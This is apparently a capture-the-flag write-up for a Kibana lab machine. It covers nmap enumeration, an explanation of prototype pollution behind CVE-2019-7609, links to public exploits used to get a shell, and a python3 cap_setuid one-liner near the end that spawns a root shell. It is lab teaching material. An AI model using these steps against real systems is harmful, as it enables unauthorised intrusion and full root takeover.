
# Scanning and Enumeration

Doing an nmap scan:

```bash
nmap -p- -A -T4 10.10.127.152
```

Output:  

```bash
PORT     STATE SERVICE      VERSION

22/tcp   open  ssh          OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey:

|   2048 9d:f8:d1:57:13:24:81:b6:18:5d:04:8e:d2:38:4f:90 (RSA)

|   256 e1:e6:7a:a1:a1:1c:be:03:d2:4e:27:1b:0d:0a:ec:b1 (ECDSA)

|_  256 2a:ba:e5:c5:fb:51:38:17:45:e7:b1:54:ca:a1:a3:fc (ED25519)

80/tcp   open  http         Apache httpd 2.4.18 ((Ubuntu))

|_http-server-header: Apache/2.4.18 (Ubuntu)

|_http-title: Site doesnt have a title (text/html)

5044/tcp open  lxi-evntsvc?

5601/tcp open  esmagent?

| fingerprint-strings: 

|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 

|     HTTP/1.1 400 Bad Request

|   FourOhFourRequest: 

|     HTTP/1.1 404 Not Found

|     kbn-name: kibana

|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c

|     content-type: application/json; charset=utf-8

|     cache-control: no-cache

|     content-length: 60

|     connection: close

|     Date: Tue, 01 Sep 2020 18:07:18 GMT

|     {"statusCode":404,"error":"Not Found","message":"Not Found"}

|   GetRequest: 

|     HTTP/1.1 302 Found

|     location: /app/kibana

|     kbn-name: kibana

|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c

|     cache-control: no-cache

|     content-length: 0

|     connection: close

|     Date: Tue, 01 Sep 2020 18:07:15 GMT

|   HTTPOptions: 

|     HTTP/1.1 404 Not Found

|     kbn-name: kibana

|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c

|     content-type: application/json; charset=utf-8

|     cache-control: no-cache

|     content-length: 38

|     connection: close

|     Date: Tue, 01 Sep 2020 18:07:15 GMT

|_    {"statusCode":404,"error":"Not Found"}

Linux 3.10 - 3.13 (95%)
```

#### Port 80
Nothing much

#### Port 5044
Nothing much

#### Port 5601
We find **Kibana**

##### What is Kibana?

Kibana is an open source frontend application
that sits on top of the Elastic Stack,
providing search and data visualization capabilities
for data indexed in Elasticsearch

##### What is Elasticsearch?

Elasticsearch lets you store, search, and analyze with ease stuff
for your website. Maby looking for actions from a specific IP address,
analyze a spike in transaction requests and more

If we enumerate the kibana application we find in the Managment tab
that the version is:  
**6.5.4**

With a quick search and compining all the info from the previous questions
we conclude that:  
**The app is vulnerable to Prototype pollution**  
**CVE-2019-7609**  

##### What is Prototype pollution tho?

Based on this resources/presentations:  

[prototype polution in kiba](https://slides.com/securitymb/prototype-pollution-in-kibana/#/19)

[prototype pollution in general](https://www.youtube.com/watch?v=LUsiFV3dsK8)

[prototype pollution in general lecture](https://github.com/HoLyVieR/prototype-pollution-nsec18)

I understood that in js when we create an object,
there's a set of default properties that I can use,
such as *toString()*, This is called **prototype-based-inheritancs**

```javascript
let obj = {
    prop1: 123,
    prop2: 456,
}

obj.prop1 // 123
obj.toString() // f toString() {[native code]}
```

Every object in JS has a prototype (It can also be null)  
We can access it via:

```javascript
obj.__proto__
```

We can do something cool with this, called **prototype chain**

```javascript
obj2 = { prop3: 3, prop4, 4}
obj = { prop1: 1, prop2: 2, __proto__: obj2}

obj.prop1 // 1
obj.prop3 // 3
```

Basically the algorithm when trying to access obj.prop3 goes:  

1. Look if it is a property of obj
2. If's not, look if it is a property of obj2
3. It is! Process finished

Here is where **prototype pollution** comes in

```javascript
Object.prototype.pollution = 123 // 123

let obj = {} // undefined

obj.pollution // 123
```

**Prototype pollution** occurs when there is a bug in an application that
makes it possible to pollute Object.prototype with arbitary properties

An example would be:

```javascript
if (user.isAdmin) {
    // Do something important
}
```

And there's a bug in application so we can assign:  
Object.prototype.isAdmin = true  
Now everyone is admin

# Exploitation

I found a github repo that explains how to exploit this
[CVE](https://github.com/mpgn/CVE-2019-7609)  

Another way to get an easy shell is to download:
[this](https://github.com/LandGrey/CVE-2019-7609/)

Following the instruction I got a shell

```bash
kiba@ubuntu:/home/kiba$ cat user.txt
cat user.txt
THM{1s_easy_pwn3d_k1bana_w1th_rce}
```

# Post Exploitation

If we look at question 5 we can imagine that the priv-esc will
have something to do with linux capabilities

##### What are linux capabilities?

Starting with kernel 2.2, Linux divides the privileges traditionally
associated with superuser into distinct units, known as capabilities,
which can be independently enabled and disabled.  Capabilities are a
per-thread attribute

We can see some usages:
[here](http://linux-vserver.org/Capabilities_and_Flags)
and
[here](https://man7.org/linux/man-pages/man7/capabilities.7.html)

To enumerate and see what **capabilities** this user has
we can do:

```bash
getcap -r /
```

We get:

```bash
/home/kiba/.hackmeplease/python3 = cap_setuid+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
```

# Privilege Escalation

cap_setuip+ep -> "allow changing of the UID"

The owner of the file is root. Meaning we, as user kibacan change our UID to
"0", whick is root.

```bash
./python3 -c ‘import os; os.setuid(0); os.system(“/bin/bash”)’
```
